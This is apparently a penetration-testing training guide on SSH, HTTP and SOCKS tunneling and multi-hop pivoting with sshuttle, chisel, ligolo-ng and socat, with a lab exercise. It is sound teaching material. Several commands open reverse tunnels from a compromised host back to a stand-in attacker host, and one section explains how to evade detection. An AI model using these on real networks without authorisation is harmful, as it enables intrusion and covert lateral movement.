# SSH and HTTP Tunneling with Pivoting

> Comprehensive guide to establishing SSH-based tunnels, HTTP/SOCKS tunnels, and multi-hop pivot chains for deep network traversal. Covers sshuttle, chisel, ligolo-ng, and socat for relay construction.

## Introduction and Objectives

Tunneling and pivoting are core techniques for network penetration testing, enabling access to isolated network segments that are not directly reachable from the attacker's position. This guide covers the primary tunneling tools available in Kali Linux, from simple SSH port forwarding to complex multi-hop pivot chains that traverse DMZ, internal, and restricted network zones.

**Learning objectives**:

- Establish transparent VPN-like network access using sshuttle for entire subnet routing
- Create targeted SSH port forwards (local, remote, dynamic/SOCKS) for specific services
- Deploy chisel for HTTP/SOCKS tunneling when SSH is blocked or monitored
- Use ligolo-ng for transparent Layer 3 pivoting with TUN interfaces
- Construct socat relay chains for ad-hoc protocol translation
- Build multi-hop pivot chains that combine multiple tunnel types for maximum reach

**Prerequisites**: SSH access to at least one pivot host on the target network. Understanding of TCP/IP networking, routing, and proxy concepts. Root access on the attacker machine (required for TUN/TAP interfaces).

## 1. Sshuttle -- Transparent VPN-like Access

Sshuttle provides the simplest path to transparent network access through an SSH pivot. Unlike per-application SOCKS proxies, sshuttle creates a TUN interface and routes entire subnets through SSH without requiring root access on the remote host.

**When to use sshuttle**: You have SSH access to a pivot host and need to run multiple unmodified tools against an internal network segment without configuring each tool individually for proxy support.

```bash
# Route entire internal subnet through SSH pivot
sshuttle -r user@pivot-host 192.168.0.0/16

# Route multiple subnets with DNS resolution through tunnel
sshuttle --dns -r user@pivot-host 10.0.0.0/8 172.16.0.0/12

# Exclude specific hosts to avoid routing conflicts
sshuttle -r user@pivot 10.0.0.0/8 -x 10.0.0.1 -x 10.0.0.254

# Use specific SSH key and port
sshuttle -r user@pivot:2222 --ssh-cmd "ssh -i ~/.ssh/pivot_key" 192.168.100.0/24
```

**Key advantages over SSH -D SOCKS proxy**: No per-application proxy configuration needed. All TCP traffic (and optionally DNS) for the target subnet is transparently routed. Works with tools that do not natively support SOCKS proxies (e.g., some database clients, proprietary protocols).

**Limitations**: Requires root on the local machine (creates TUN interface). Only routes TCP -- UDP traffic requires additional tunneling. Each sshuttle instance covers one SSH pivot; for multi-hop, chain multiple instances.

## 2. SSH Port Forwarding -- Targeted Relays

When sshuttle is overkill (you only need specific ports) or unavailable (no root on local machine), SSH port forwarding provides targeted relay tunnels.

```bash
# Local forward: expose internal service on local port
ssh -L 3306:db-internal:3306 user@pivot-host
# Now: mysql -h 127.0.0.1 connects to db-internal:3306 through pivot

# Remote forward: expose a local service to the remote network
ssh -R 8080:127.0.0.1:80 user@pivot-host
# Now: pivot-host:8080 reaches your local web server

# Dynamic forward (SOCKS proxy)
ssh -D 1080 user@pivot-host
# Now: proxychains4 curl http://internal-host routes through SOCKS

# Jump through multiple hosts with ProxyJump
ssh -J user@dmz-host user@internal-host
# Equivalent: ssh -o ProxyCommand="ssh -W %h:%p user@dmz-host" user@internal-host
```

**SSH tunnel hardening**: Add `ServerAliveInterval 60` and `ServerAliveCountMax 3` to keep tunnels alive through idle periods. Use `ExitOnForwardFailure yes` to prevent silent failures. Run with `-fN` for background operation.

## 3. Chisel -- HTTP/SOCKS Tunnel for Restricted Networks

When SSH is blocked or monitored, chisel tunnels TCP over HTTP, blending with normal web traffic. It supports both SOCKS5 proxy mode and reverse port forwarding.

```bash
# Server (attacker machine)
chisel server -p 8080 --reverse --socks5 --auth user:password

# Client (compromised host) -- reverse SOCKS proxy
chisel client --auth user:password http://attacker:8080 R:socks

# Client -- reverse port forward for specific service
chisel client http://attacker:8080 R:9090:10.10.10.50:3389
# Now attacker:9090 reaches 10.10.10.50:3389 through compromised host

# Client with custom headers to mimic legitimate traffic
chisel client http://attacker:8080 R:socks \
  --header "X-Forwarded-For: proxy.internal" \
  --header "User-Agent: Mozilla/5.0"
```

**Chisel architecture**: The server listens on the attacker-controlled host. The client runs on the compromised pivot and initiates an outbound HTTP connection. With `--reverse`, the server can request the client to create listeners. The SOCKS5 mode creates a proxy on the attacker machine that routes traffic through the client's network position.

**Detection evasion**: Chisel traffic looks like HTTP long-polling connections. Wrap it with stunnel (see socks-proxy-chain-traffic guide) for TLS encryption that defeats HTTP content inspection. Use non-standard ports (443, 8443, 8080) that are commonly associated with web services.

## 4. Ligolo-ng -- Transparent Pivoting with TUN Interface

Ligolo-ng creates a TUN interface on the attacker machine that routes traffic through a compromised agent via a TLS-encrypted control channel. It provides the most transparent pivoting experience -- similar to sshuttle but with a dedicated agent that does not require SSH on the target.

```bash
# Proxy (attacker machine)
./proxy -selfcert -laddr 0.0.0.0:9001

# Agent (compromised host)
./agent -connect attacker:9001 -ignore-cert

# In ligolo-ng proxy console:
# session_select 1        -- select the connected agent
# ifcreate --name pivot0  -- create TUN interface
# tunnel_start --name pivot0  -- start routing

# Route target subnet through TUN interface
sudo ip route add 192.168.50.0/24 dev pivot0

# Multi-hop: start a second ligolo-ng listener on the first agent's host
# Connect second agent through the first tunnel
```

**Ligolo-ng vs chisel**: Ligolo-ng provides Layer 3 access (entire subnet routing via TUN), while chisel provides Layer 4 access (SOCKS proxy for TCP). Ligolo-ng is more transparent but requires TUN/TAP capability on the attacker machine. Chisel is simpler to deploy when only specific ports are needed.

## 5. Socat -- Relay Chain Construction

Socat is the Swiss Army knife for building relay chains between any two endpoints. It supports TCP, UDP, SSL, SOCKS, and file descriptors, making it ideal for constructing ad-hoc relay chains.

```bash
# Simple TCP relay: forward port 8080 to internal service
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.50:80

# SSL relay: wrap internal HTTP in TLS
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:127.0.0.1:8080

# Chain through SOCKS proxy
socat TCP-LISTEN:9090,fork SOCKS5:127.0.0.1:target:80,socksport=1080

# UDP relay (for DNS forwarding)
socat UDP-LISTEN:5353,fork UDP:8.8.8.8:53
```

**Socat relay patterns**: Use `fork` to handle multiple concurrent connections. Add `reuseaddr` to allow quick restarts. Chain multiple socat instances to build multi-protocol relay paths. Use `SYSTEM:` to pipe traffic through shell commands for logging or transformation.

## 6. Multi-Hop Pivot Construction

Building a multi-hop pivot chain requires careful planning of tunnel types at each hop to maximize stealth and reliability.

```
Operator Workstation
    |
    v  [SSH SOCKS proxy :1080]
DMZ Host (first pivot)
    |
    v  [Chisel HTTP tunnel through SOCKS proxy]
Internal Host (second pivot)
    |
    v  [Ligolo-ng TUN interface]
Database Network (target segment)
```

**Step-by-step construction**:

1. Establish SSH SOCKS proxy to DMZ: `ssh -D 1080 -fN user@dmz-host`
2. Deploy chisel through SOCKS: `proxychains4 scp chisel internal-host:/tmp/`
3. Start chisel client on internal host, connecting back through DMZ
4. Configure second SOCKS proxy from chisel on port 1081
5. Deploy ligolo-ng agent on internal host
6. Connect ligolo-ng proxy through the chained SOCKS proxies
7. Route final target subnet through ligolo-ng TUN: `ip route add 10.10.20.0/24 dev tunnel0`

**Monitoring and maintenance**: Use `ServerAliveInterval` on SSH tunnels. Monitor chisel connection status. Keep ligolo-ng sessions alive with periodic heartbeat traffic. Document each hop's IP, port, and tunnel type for engagement reporting and cleanup.

## Hands-on Exercise: Multi-Hop Pivot Construction

Practice building a complete multi-hop pivot chain in a lab environment:

**Setup**:

```bash
# Create a lab with three network segments using VMs or containers
# Segment 1: Attacker network (192.168.1.0/24)
# Segment 2: DMZ (10.0.0.0/24) - accessible from attacker
# Segment 3: Internal (172.16.0.0/24) - only accessible from DMZ
```

**Exercise steps**:

1. Establish SSH SOCKS proxy to the DMZ host: `ssh -D 1080 user@dmz-host`
2. Verify access to DMZ services through the SOCKS proxy using proxychains
3. Deploy chisel to the internal host through the SOCKS proxy using `proxychains4 scp`
4. Start a chisel reverse SOCKS tunnel from the internal host through the DMZ
5. Configure proxychains to chain through both SOCKS proxies (DMZ then internal)
6. Verify access to the internal network segment (172.16.0.0/24) through the chained proxy
7. Optionally, deploy ligolo-ng for transparent subnet routing through the pivot chain
8. Document the complete pivot chain with IPs, ports, and tunnel types

**Validation criteria**: Successfully reach a host on the 172.16.0.0/24 segment from the attacker workstation. Run nmap through the complete proxy chain. Document the chain configuration for reporting.

## References and Resources

- **dns-icmp-covert-tunnel.md** -- For DNS and ICMP tunneling when TCP-based tunnels are blocked
- **socks-proxy-chain-traffic.md** -- For proxy chaining configuration and TLS wrapping of these tunnels
- **post-exploitation skill** -- For the broader lateral movement context where pivoting is used
- [sshuttle Documentation](https://github.com/sshuttle/sshuttle)
- [chisel GitHub Repository](https://github.com/jpillora/chisel)
- [ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
- [HackTricks - Pivoting](https://book.hacktricks.xyz/generic-methodologies-and-resources/pivoting)
